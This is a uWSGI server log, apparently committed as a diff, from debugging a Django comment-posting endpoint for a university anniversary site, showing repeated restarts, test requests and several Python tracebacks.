+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55cccc439cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55cccc439cb0 pid: 28103 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28103)
+spawned uWSGI worker 1 (pid: 28104, cores: 1)
+[pid: 28104|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:04:35 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 0 bytes in 110 msecs (HTTP/1.1 200) 4 headers in 134 bytes (1 switches on core 0)
+Sun May 31 03:04:46 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:04:47 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x563a42a7bcb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x563a42a7bcb0 pid: 28108 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28108)
+spawned uWSGI worker 1 (pid: 28109, cores: 1)
+[pid: 28109|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:04:48 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 10 bytes in 111 msecs (HTTP/1.1 200) 4 headers in 135 bytes (1 switches on core 0)
+Sun May 31 03:04:57 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:04:58 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x56139e9bfcb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56139e9bfcb0 pid: 28113 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28113)
+spawned uWSGI worker 1 (pid: 28114, cores: 1)
+[pid: 28114|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:04:59 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 5 bytes in 110 msecs (HTTP/1.1 200) 4 headers in 134 bytes (1 switches on core 0)
+Sun May 31 03:05:20 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:05:21 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55b2761e0cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55b2761e0cb0 pid: 28121 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28121)
+spawned uWSGI worker 1 (pid: 28122, cores: 1)
+[pid: 28122|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:05:22 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 40 bytes in 111 msecs (HTTP/1.1 200) 4 headers in 135 bytes (2 switches on core 0)
+[pid: 28122|app: 0|req: 2/2] 122.238.122.231 () {42 vars in 925 bytes} [Sun May 31 03:07:20 2020] GET /addComment/-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 41 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 135 bytes (2 switches on core 0)
+Sun May 31 03:07:27 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:07:27 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x565515ca8cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x565515ca8cb0 pid: 28131 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28131)
+spawned uWSGI worker 1 (pid: 28132, cores: 1)
+Internal Server Error: /addComment/-17级-7班-张三-祝福-123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 30, in addComment
+    comment.Comment = tmp[6]
+IndexError: list index out of range
+[pid: 28132|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 956 bytes} [Sun May 31 03:07:28 2020] GET /addComment/-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 60091 bytes in 134 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
+Sun May 31 03:07:44 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:07:45 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x556178612cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x556178612cb0 pid: 28136 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28136)
+spawned uWSGI worker 1 (pid: 28137, cores: 1)
+[pid: 28137|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 956 bytes} [Sun May 31 03:07:46 2020] GET /addComment/-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 4 bytes in 111 msecs (HTTP/1.1 200) 4 headers in 134 bytes (1 switches on core 0)
+[pid: 28137|app: 0|req: 2/2] 122.238.122.231 () {42 vars in 927 bytes} [Sun May 31 03:08:03 2020] GET /addComment/--17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 5 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 134 bytes (2 switches on core 0)
+[pid: 28137|app: 0|req: 3/3] 122.238.122.231 () {42 vars in 925 bytes} [Sun May 31 03:08:18 2020] GET /addComment/-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 4 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 134 bytes (2 switches on core 0)
+[pid: 28137|app: 0|req: 4/4] 122.238.122.231 () {44 vars in 956 bytes} [Sun May 31 03:08:57 2020] GET /addComment/-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 4 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 134 bytes (2 switches on core 0)
+Sun May 31 03:08:59 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:09:00 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x558f5bc28cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x558f5bc28cb0 pid: 28143 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28143)
+spawned uWSGI worker 1 (pid: 28144, cores: 1)
+[pid: 28144|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 956 bytes} [Sun May 31 03:09:01 2020] GET /addComment/-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 1803 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+[pid: 28144|app: 0|req: 2/2] 122.238.122.231 () {42 vars in 973 bytes} [Sun May 31 03:09:43 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 1960 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Sun May 31 03:10:20 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:10:21 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x557cb6e87cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x557cb6e87cb0 pid: 28173 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28173)
+spawned uWSGI worker 1 (pid: 28174, cores: 1)
+[pid: 28174|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:10:22 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 2385 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Sun May 31 03:11:42 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:11:43 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x5562fa0b1cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5562fa0b1cb0 pid: 28182 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28182)
+spawned uWSGI worker 1 (pid: 28183, cores: 1)
+Internal Server Error: /addComment/计算机系-17级-7班-张三-祝福-123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 39, in addComment
+    QAQ = models.filter(comment)
+AttributeError: module 'backendApi.models' has no attribute 'filter'
+[pid: 28183|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:11:44 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 60777 bytes in 1466 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
+Sun May 31 03:12:32 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:12:33 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55bd4aeddcb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55bd4aeddcb0 pid: 28187 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28187)
+spawned uWSGI worker 1 (pid: 28188, cores: 1)
+Internal Server Error: /addComment/计算机系-17级-7班-张三-祝福-123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 39, in addComment
+    QAQ = models.Comment.objects.filter(comment)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 904, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 923, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1351, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1382, in _add_q
+    check_filterable=check_filterable,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1248, in build_filter
+    arg, value = filter_expr
+TypeError: cannot unpack non-iterable Comment object
+[pid: 28188|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:12:35 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 89684 bytes in 1303 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+Sun May 31 03:13:27 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:13:28 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x555a1d0c1cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x555a1d0c1cb0 pid: 28192 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28192)
+spawned uWSGI worker 1 (pid: 28193, cores: 1)
+[pid: 28193|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:13:29 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 1568 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
+Sun May 31 03:13:57 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:13:58 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
